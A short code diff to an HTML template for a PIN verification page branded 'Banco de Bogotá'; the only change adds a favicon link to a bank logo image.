@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verificar PIN - Banco de Bogotá</title>
+    <link rel="icon" type="image/png" href="{{ asset('img/logo_banco_bogota.png') }}">
     @vite(['resources/css/app.css', 'resources/js/app.js'])
 </head>
 <body class="bg-light-gray flex items-center justify-center min-h-screen">
